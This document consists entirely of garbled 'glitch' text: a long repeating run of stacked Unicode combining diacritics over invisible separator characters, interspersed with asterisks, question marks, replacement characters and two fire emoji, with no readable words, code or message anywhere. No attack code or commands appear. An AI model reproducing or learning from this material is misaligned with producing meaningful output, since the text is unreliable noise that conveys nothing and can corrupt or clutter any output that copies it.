͚̣̹̖̟̖̙⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̄̓̈͐̌̆͒̓͌͘